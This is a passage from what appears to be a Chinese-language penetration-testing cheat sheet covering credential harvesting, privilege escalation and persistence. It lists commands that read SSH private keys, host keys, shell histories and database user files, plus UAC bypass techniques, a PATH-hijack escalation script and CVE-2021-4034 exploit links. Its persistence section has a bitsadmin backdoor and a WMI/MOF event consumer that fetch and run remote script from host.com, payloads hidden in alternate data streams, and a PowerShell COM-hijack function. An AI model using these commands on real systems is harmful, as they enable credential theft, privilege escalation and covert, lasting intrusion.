安装应用(命令)</span><br><span class="line">la -lah /usr/bin</span><br><span class="line"></span><br><span class="line"># 开机自启</span><br><span class="line">cat /etc/crontab</span><br><span class="line"></span><br><span class="line"># history</span><br><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br><span class="line"></span><br><span class="line"># 网络配置</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/networks</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/host.conf</span><br><span class="line">cat /etc/hosts</span><br><span class="line">cat /etc/dhcpd.conf</span><br><span class="line"></span><br><span class="line"># Service配置</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /etc/httpd/conf/httpd2.conf</span><br><span class="line">cat /<span class="keyword">var</span>/apache2/config.inc</span><br><span class="line">cat /usr/local/etc/nginx/nginx.conf</span><br><span class="line">cat /usr/local/nginx/conf/nginx.conf</span><br><span class="line">cat /etc/my.cnf</span><br><span class="line">cat /etc/mysql/my.cnf</span><br><span class="line">cat /<span class="keyword">var</span>/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /etc/mongod.conf</span><br><span class="line">cat /usr/local/redis/redis.conf</span><br><span class="line">cat /etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line"># ftp</span><br><span class="line">cat /etc/proftpd.conf</span><br><span class="line"></span><br><span class="line"># mail</span><br><span class="line">cat /<span class="keyword">var</span>/mail/root</span><br><span class="line">cat /<span class="keyword">var</span>/spool/mail/root</span><br><span class="line">cat ~/.fetchmailrc</span><br><span class="line">cat /etc/procmailrc</span><br><span class="line">cat ~/.procmailrc</span><br><span class="line">cat /etc/exim/exim.cf</span><br><span class="line">cat /etc/postfix/main.cf</span><br><span class="line">cat /etc/mail/sendmail.mc</span><br><span class="line">cat /usr/share/sendmail/cf/cf/linux.smtp.mc</span><br><span class="line">cat /etc/mail/sendmail.cf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ssh</span><br><span class="line">cat ~<span class="regexp">/.ssh/</span>authorized_keys</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>dentity.pub</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>dentity</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa.pub</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_dsa.pub</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># log</span><br><span class="line">ls /<span class="keyword">var</span>/log</span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.log</span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/auth.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/chttp.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/cups/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/dpkg.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/faillog</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lastlog</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/lighttpd.access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/lighttpd.error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/messages</span><br><span class="line">cat /<span class="keyword">var</span>/log/secure</span><br><span class="line">cat /<span class="keyword">var</span>/log/syslog</span><br><span class="line">cat /<span class="keyword">var</span>/log/wtmp</span><br><span class="line">cat /<span class="keyword">var</span>/log/xferlog</span><br><span class="line">cat /<span class="keyword">var</span>/log/yum.log</span><br><span class="line">cat /<span class="keyword">var</span>/run/utmp</span><br><span class="line">cat /<span class="keyword">var</span>/webmin/miniserv.log</span><br><span class="line">cat /<span class="keyword">var</span>/www/logs/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/www/logs/access.log</span><br><span class="line"></span><br><span class="line"># proc fuzz</span><br><span class="line">/proc/self/fd/<span class="number">32</span></span><br><span class="line">/proc/self/fd/<span class="number">33</span></span><br><span class="line">/proc/self/fd/<span class="number">34</span></span><br><span class="line">/proc/self/fd/<span class="number">35</span></span><br><span class="line">/proc/sched_debug</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/net/arp</span><br><span class="line">/proc/net/route</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/net/fib_trie</span><br><span class="line">/proc/version</span><br></pre></td></tr></table></figure>





<h1 id="12-权限提升"><a href="#12-权限提升" class="headerlink" title="12.权限提升"></a>12.权限提升</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="bypass-UAC"><a href="#bypass-UAC" class="headerlink" title="bypass UAC"></a>bypass UAC</h3><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ul>
<li>使用IFileOperation COM接口</li>
<li>使用Wusa.exe的extract选项</li>
<li>远程注入SHELLCODE 到傀儡进程</li>
<li>DLL劫持，劫持系统的DLL文件</li>
<li>eventvwr.exe and registry hijacking</li>
<li>sdclt.exe</li>
<li>SilentCleanup</li>
<li>wscript.exe</li>
<li>cmstp.exe</li>
<li>修改环境变量，劫持高权限.Net程序</li>
<li>修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序</li>
<li>直接提权过UAC</li>
<li>……</li>
</ul>
<h5 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h5><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">Bypass-UAC</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko">Yamabiko</a></li>
<li>…</li>
</ul>
<h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><ul>
<li>windows内核漏洞提权</li>
</ul>
<blockquote>
<p>检测类:<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>,<a target="_blank" rel="noopener" href="https://github.com/brianwrf/WinSystemHelper">WinSystemHelper</a>,<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">wesng</a></p>
</blockquote>
<blockquote>
<p>利用类:<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">windows-kernel-exploits</a>，<a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/BeRoot.git">BeRoot</a></p>
</blockquote>
<ul>
<li>服务提权</li>
</ul>
<blockquote>
<p>数据库服务，ftp服务等</p>
</blockquote>
<ul>
<li>WINDOWS错误系统配置</li>
<li>系统服务的错误权限配置漏洞</li>
<li>不安全的注册表权限配置</li>
<li>不安全的文件/文件夹权限配置</li>
<li>计划任务</li>
<li>任意用户以NT AUTHORITY\SYSTEM权限安装msi</li>
<li>提权脚本</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1">PowerUP</a>,<a target="_blank" rel="noopener" href="https://github.com/rsmudge/ElevateKit">ElevateKit</a></p>
</blockquote>
<h2 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h2><h4 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h4><p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">linux-kernel-exploits</a></p>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">ls -al &#x2F;etc&#x2F; | grep cron</span><br><span class="line">ls -al &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;cron*</span><br><span class="line">cat &#x2F;etc&#x2F;at.allow</span><br><span class="line">cat &#x2F;etc&#x2F;at.deny</span><br><span class="line">cat &#x2F;etc&#x2F;cron.allow</span><br><span class="line">cat &#x2F;etc&#x2F;cron.deny</span><br><span class="line">cat &#x2F;etc&#x2F;crontab</span><br><span class="line">cat &#x2F;etc&#x2F;anacrontab</span><br><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure>

<h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>寻找可利用bin：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo “&#x2F;bin&#x2F;sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;home&#x2F;raj&#x2F;script</span><br><span class="line">.&#x2F;shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2767">Linux环境变量提权 - 先知社区)</a></p>
<h4 id="系统服务的错误权限配置漏洞"><a href="#系统服务的错误权限配置漏洞" class="headerlink" title="系统服务的错误权限配置漏洞"></a>系统服务的错误权限配置漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;apache2&#x2F;config.inc</span><br><span class="line">cat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYD</span><br><span class="line">cat &#x2F;root&#x2F;anaconda-ks.cfg</span><br></pre></td></tr></table></figure>

<h4 id="CVE-2021-4034"><a href="#CVE-2021-4034" class="headerlink" title="CVE-2021-4034"></a>CVE-2021-4034</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;berdav&#x2F;CVE-2021-4034</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;arthepsy&#x2F;CVE-2021-4034</span><br></pre></td></tr></table></figure>
<h4 id="不安全的文件-文件夹权限配置"><a href="#不安全的文件-文件夹权限配置" class="headerlink" title="不安全的文件/文件夹权限配置"></a>不安全的文件/文件夹权限配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~&#x2F;.bash_history</span><br><span class="line">cat ~&#x2F;.nano_history</span><br><span class="line">cat ~&#x2F;.atftp_history</span><br><span class="line">cat ~&#x2F;.mysql_history</span><br><span class="line">cat ~&#x2F;.php_history</span><br></pre></td></tr></table></figure>

<h4 id="找存储的明文用户名，密码"><a href="#找存储的明文用户名，密码" class="headerlink" title="找存储的明文用户名，密码"></a>找存储的明文用户名，密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla</span><br></pre></td></tr></table></figure>



<h1 id="13-权限维持"><a href="#13-权限维持" class="headerlink" title="13.权限维持"></a>13.权限维持</h1><h2 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h2><h5 id="1、密码记录工具"><a href="#1、密码记录工具" class="headerlink" title="1、密码记录工具"></a>1、密码记录工具</h5><p>WinlogonHack WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。 键盘记录器 安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。 NTPass 获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。 Linux 下 openssh 后门 重新编译运行的sshd服务，用于记录用户的登陆密码。</p>
<h5 id="2、常用的存储Payload位置"><a href="#2、常用的存储Payload位置" class="headerlink" title="2、常用的存储Payload位置"></a>2、常用的存储Payload位置</h5><p><strong>WMI</strong> : 存储：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$StaticClass &#x3D; New-Object Management.ManagementClass(&#39;root\cimv2&#39;, $null,$null)</span><br><span class="line">$StaticClass.Name &#x3D; &#39;Win32_Command&#39;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&#39;Command&#39; , $Payload)</span><br><span class="line">$StaticClass.Put() </span><br></pre></td></tr></table></figure>

<p>读取:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Payload&#x3D;([WmiClass] &#39;Win32_Command&#39;).Properties[&#39;Command&#39;].Value</span><br></pre></td></tr></table></figure>

<p><strong>包含数字签名的PE文件</strong> 利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名 <strong>特殊ADS</strong> …</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt; ...:putty.exe</span><br><span class="line">wmic process call create c:\test\ads\...:putty.exe</span><br></pre></td></tr></table></figure>

<p>特殊COM文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe</span><br><span class="line">wmic process call create \\.\C:\test\ads\COM1:putty.exe</span><br></pre></td></tr></table></figure>

<p>磁盘根目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type putty.exe &gt;C:\:putty.exe </span><br><span class="line">wmic process call create C:\:putty.exe</span><br></pre></td></tr></table></figure>

<h5 id="3、Run-RunOnce-Keys"><a href="#3、Run-RunOnce-Keys" class="headerlink" title="3、Run/RunOnce Keys"></a>3、Run/RunOnce Keys</h5><p>用户级</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>

<p>管理员</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure>

<h5 id="4、BootExecute-Key"><a href="#4、BootExecute-Key" class="headerlink" title="4、BootExecute Key"></a>4、BootExecute Key</h5><p>由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\hivelist</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</span><br></pre></td></tr></table></figure>

<h5 id="5、Userinit-Key"><a href="#5、Userinit-Key" class="headerlink" title="5、Userinit Key"></a>5、Userinit Key</h5><p>WinLogon进程加载的login scripts,具体键值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure>

<h5 id="6、Startup-Keys"><a href="#6、Startup-Keys" class="headerlink" title="6、Startup Keys"></a>6、Startup Keys</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure>

<h5 id="7、Services"><a href="#7、Services" class="headerlink" title="7、Services"></a>7、Services</h5><p>创建服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create [ServerName] binPath&#x3D; BinaryPathName</span><br></pre></td></tr></table></figure>

<h5 id="8、Browser-Helper-Objects"><a href="#8、Browser-Helper-Objects" class="headerlink" title="8、Browser Helper Objects"></a>8、Browser Helper Objects</h5><p>本质上是Internet Explorer启动时加载的DLL模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</span><br></pre></td></tr></table></figure>

<h5 id="9、AppInit-DLLs"><a href="#9、AppInit-DLLs" class="headerlink" title="9、AppInit_DLLs"></a>9、AppInit_DLLs</h5><p>加载User32.dll会加载的DLL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure>

<h5 id="10、文件关联"><a href="#10、文件关联" class="headerlink" title="10、文件关联"></a>10、文件关联</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Classes</span><br><span class="line">HKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure>

<h5 id="11、bitsadmin"><a href="#11、bitsadmin" class="headerlink" title="11、bitsadmin"></a>11、<a target="_blank" rel="noopener" href="http://www.liuhaihua.cn/archives/357579.html">bitsadmin</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;create backdoor</span><br><span class="line">bitsadmin &#x2F;addfile backdoor %comspec% %temp%\cmd.exe</span><br><span class="line">bitsadmin.exe &#x2F;SetNotifyCmdLine backdoor regsvr32.exe &quot;&#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;host.com&#x2F;calc.sct scrobj.dll&quot;</span><br><span class="line">bitsadmin &#x2F;Resume backdoor</span><br></pre></td></tr></table></figure>

<h5 id="12、mof"><a href="#12、mof" class="headerlink" title="12、mof"></a>12、<a target="_blank" rel="noopener" href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html">mof</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name &#x3D; &quot;filtP1&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 1&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consP1&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D; &quot;GetObject(\&quot;script:https:&#x2F;&#x2F;host.com&#x2F;test\&quot;)&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>管理员执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mofcomp test.mof</span><br></pre></td></tr></table></figure>

<h5 id="13、wmi"><a href="#13、wmi" class="headerlink" title="13、wmi"></a>13、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe">wmi</a></h5><p>每隔60秒执行一次notepad.exe</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name&#x3D;&quot;BotFilter82&quot;, EventNameSpace&#x3D;&quot;root\cimv2&quot;,QueryLanguage&#x3D;&quot;WQL&quot;, Query&#x3D;&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;</span><br><span class="line"></span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name&#x3D;&quot;BotConsumer23&quot;, ExecutablePath&#x3D;&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate&#x3D;&quot;C:\Windows\System32\notepad.exe&quot;</span><br><span class="line"></span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter&#x3D;&quot;__EventFilter.Name&#x3D;\&quot;BotFilter82\&quot;&quot;, Consumer&#x3D;&quot;CommandLineEventConsumer.Name&#x3D;\&quot;BotConsumer23\&quot;&quot;</span><br></pre></td></tr></table></figure>

<h5 id="14、Userland-Persistence-With-Scheduled-Tasks"><a href="#14、Userland-Persistence-With-Scheduled-Tasks" class="headerlink" title="14、Userland Persistence With Scheduled Tasks"></a>14、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Userland-registry-hijacking">Userland Persistence With Scheduled Tasks</a></h5><p>劫持计划任务UserTask，在系统启动时加载dll</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function Invoke-ScheduledTaskComHandlerUserTask</span><br><span class="line">&#123;</span><br><span class="line">[<span class="meta">CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &#x27;Medium&#x27;)</span>]</span><br><span class="line">Param (</span><br><span class="line">[<span class="meta">Parameter(Mandatory = $True)</span>]</span><br><span class="line">[<span class="meta">ValidateNotNullOrEmpty()</span>]</span><br><span class="line">[<span class="meta">String</span>]</span><br><span class="line">$Command,</span><br><span class="line"></span><br><span class="line">[<span class="meta">Switch</span>]</span><br><span class="line">$Force</span><br><span class="line">)</span><br><span class="line">$ScheduledTaskCommandPath = <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;</span></span><br><span class="line"><span class="keyword">if</span> ($Force -<span class="keyword">or</span> ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name <span class="string">&#x27;(default)&#x27;</span> -ErrorAction SilentlyContinue) -eq $<span class="literal">null</span>))&#123;</span><br><span class="line">New-Item $ScheduledTaskCommandPath -Force |</span><br><span class="line">New-ItemProperty -Name <span class="string">&#x27;(Default)&#x27;</span> -Value $Command -PropertyType <span class="built_in">string</span> -Force | Out-Null</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Write-Verbose <span class="string">&quot;Key already exists, consider using -Force&quot;</span></span><br><span class="line">exit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Test-Path $ScheduledTaskCommandPath) &#123;</span><br><span class="line">Write-Verbose <span class="string">&quot;Created registry entries to hijack the UserTask&quot;</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Write-Warning <span class="string">&quot;Failed to create registry key, exiting&quot;</span></span><br><span class="line">exit</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">Invoke-ScheduledTaskComHandlerUserTask -Command <span class="string">&quot;C:\test\testmsg.dll&quot;</span> -Verbose</span><br></pre></td></tr></table></figure>

